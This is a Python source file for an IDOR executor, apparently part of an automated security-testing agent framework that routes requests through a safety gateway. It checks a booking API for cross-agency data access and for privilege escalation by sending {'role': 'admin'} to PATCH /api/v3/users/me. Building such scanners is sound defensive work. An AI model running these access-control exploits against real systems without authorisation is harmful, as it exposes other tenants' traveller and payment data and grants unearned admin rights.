"""Access Control Executor: Cross-agency IDOR & privilege escalation."""

from __future__ import annotations

import uuid

import httpx

from agents.planner import AssertionOracle, AttackTask, CandidateFinding, HttpStepSpec
from safety.gateway import SafeAsyncClient, SafetyGateway


class IDORExecutor:
    """Tests cross-agency booking IDOR and subagent-to-admin privilege escalation."""

    name = "idor"

    def __init__(
        self,
        gateway: SafetyGateway,
        base_url: str = "http://127.0.0.1:8001",
        async_transport: httpx.AsyncBaseTransport | None = None,
    ) -> None:
        self.gateway = gateway
        self.base_url = base_url.rstrip("/")
        self._async_transport = async_transport

    @staticmethod
    def _candidate_target_paths(task: AttackTask) -> list[str]:
        """Collect dynamically observed resource paths belonging to Agency A / shared logs before fallback."""
        canonical = task.canonical_path
        candidates: list[str] = []
        beta_only = set(task.role_sample_paths.get("agency_b_admin", []))

        for role in ("agency_a_admin", "agency_a_subagent"):
            for sp in task.role_sample_paths.get(role, []):
                if sp != canonical and "{" not in sp and sp not in candidates:
                    candidates.append(sp)

        for sp in task.sample_paths:
            if sp != canonical and "{" not in sp and sp not in beta_only and sp not in candidates:
                candidates.append(sp)

        if not candidates and "{id}" in canonical:
            candidates.append(canonical.replace("{id}", "1001"))
        return candidates[:3]

    async def execute(self, task: AttackTask) -> list[CandidateFinding]:
        candidates: list[CandidateFinding] = []
        path = task.canonical_path

        if (
            "/bookings/{id}" in path
            or ("{id}" in path and any(tag in task.sensitivity_tags for tag in ("BOOKINGS", "PII_TRAVELLER", "PAYMENTS_CREDIT")))
        ) and task.method == "GET":
            for target_path in self._candidate_target_paths(task):
                async with SafeAsyncClient(
                    self.gateway, agent="executor_idor", actor="agency_a_admin", pace=True, inner_transport=self._async_transport
                ) as alpha_client:
                    base_resp = await alpha_client.get(f"{self.base_url}{target_path}")
                if base_resp.status_code != 200:
                    continue

                async with SafeAsyncClient(
                    self.gateway, agent="executor_idor", actor="agency_b_admin", pace=True, inner_transport=self._async_transport
                ) as beta_client:
                    exploit_resp = await beta_client.get(f"{self.base_url}{target_path}")
                if exploit_resp.status_code != 200:
                    continue

                try:
                    base_body = base_resp.json()
                    exploit_body = exploit_resp.json()
                except Exception:  # noqa: BLE001
                    continue
                if not isinstance(base_body, dict) or not isinstance(exploit_body, dict):
                    continue

                ownership_field = next(
                    (f for f in ("agency_id", "tenant_id", "org_id", "owner_agency") if base_body.get(f) is not None),
                    None,
                )
                if ownership_field is None:
                    continue
                victim_value = base_body.get(ownership_field)
                if exploit_body.get(ownership_field) == victim_value:
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class="Access control",
                            executor="idor",
                            canonical_endpoint=path,
                            method="GET",
                            affected_parameter="id",
                            title=f"Cross-Agency IDOR on {path}",
                            summary=(
                                f"Agency Beta admin accessed Agency Alpha resource {target_path} "
                                f"({ownership_field}={victim_value})."
                            ),
                            baseline_step=HttpStepSpec(method="GET", path=target_path, actor="agency_a_admin"),
                            exploit_step=HttpStepSpec(method="GET", path=target_path, actor="agency_b_admin"),
                            oracle=AssertionOracle(
                                oracle_type="cross_agency_leak",
                                target_field=ownership_field,
                                forbidden_value=victim_value,
                            ),
                        )
                    )
                    break

        if "/users/me" in path and task.method == "PATCH":
            async with SafeAsyncClient(
                self.gateway,
                agent="executor_idor",
                actor="agency_a_subagent",
                pace=True,
                inner_transport=self._async_transport,
            ) as sub_client:
                baseline = await sub_client.patch(
                    f"{self.base_url}/api/v3/users/me",
                    json={"display_name": "Sub Agent Baseline"},
                )
                self.gateway.validator.check_payload_budget("role", 1)
                exploit = await sub_client.patch(
                    f"{self.base_url}/api/v3/users/me",
                    json={"role": "admin"},
                )
            if baseline.status_code == 200 and exploit.status_code == 200:
                if exploit.json().get("role") == "admin":
                    candidates.append(
                        CandidateFinding(
                            candidate_id=f"CAND-{uuid.uuid4().hex[:8].upper()}",
                            vuln_class="Access control",
                            executor="idor",
                            canonical_endpoint=path,
                            method="PATCH",
                            affected_parameter="role",
                            title="Sub-agent to Admin Privilege Escalation via Mass Assignment",
                            summary="Sub-agent elevated own role to 'admin' via PATCH /api/v3/users/me.",
                            baseline_step=HttpStepSpec(
                                method="PATCH",
                                path="/api/v3/users/me",
                                actor="agency_a_subagent",
                                json_body={"display_name": "Sub Agent Baseline"},
                            ),
                            exploit_step=HttpStepSpec(
                                method="PATCH",
                                path="/api/v3/users/me",
                                actor="agency_a_subagent",
                                json_body={"role": "admin"},
                            ),
                            oracle=AssertionOracle(
                                oracle_type="role_escalation",
                                target_field="role",
                                forbidden_value="admin",
                            ),
                        )
                    )
        return candidates
